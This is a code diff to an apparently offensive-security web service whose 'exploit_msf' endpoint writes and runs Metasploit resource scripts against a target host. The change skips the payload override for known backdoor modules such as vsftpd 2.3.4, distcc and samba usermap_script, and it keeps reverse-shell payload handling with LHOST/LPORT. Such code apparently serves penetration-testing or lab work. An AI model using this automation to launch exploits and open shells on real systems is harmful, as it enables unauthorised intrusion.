@@ -4317,20 +4317,30 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
         payload = "windows/x64/shell_reverse_tcp"
     # interact/bind/find_tag payloads connect TO the target's open port (or
     # interact directly with a backdoor) — they don't open a listener on our
-    # side, so LHOST/LPORT are not relevant for them. Setting them in the
-    # batch RC would not break things, but cleaner to skip.
+    # side, so LHOST/LPORT are not relevant for them.
     is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
     # LHOST only required for reverse-shell payloads — backdoor/interact
     # payloads (like cmd/unix/interact for vsftpd 2.3.4) don't need it.
     if is_reverse and not req.lhost:
         return {"error": "LHOST required for reverse payload " + payload}
     lhost_block = f"set LHOST {req.lhost}\nset LPORT {req.lport}\n" if is_reverse and req.lhost else ""
+
+    # Backdoor / pre-installed-shell modules (vsftpd_234, distcc_exec, samba
+    # usermap_script, unreal_ircd_3281, ircd backdoors) each ship with a
+    # known-good DEFAULT payload — overriding it with our own "set PAYLOAD"
+    # line was causing Metasploit to reject incompatible architectures (e.g.
+    # picking a Windows shell for a Unix backdoor). Skip the override for
+    # these modules and let MSF use its module-internal default.
+    backdoor_indicators = ["backdoor", "ircd", "vsftpd", "distcc", "samba/usermap", "unreal_ircd"]
+    is_backdoor_module = any(b in module.lower() for b in backdoor_indicators)
+    payload_block = "" if is_backdoor_module else f"set PAYLOAD {payload}\n"
+
     rc = (
         f"use {module}\n"
         f"set RHOSTS {host}\n"
         f"set RPORT {req.port}\n"
         + lhost_block +
-        f"set PAYLOAD {payload}\n"
+        payload_block +
         f"set ExitOnSession false\n"
         f"run -j\n"
         f"sleep 25\n"
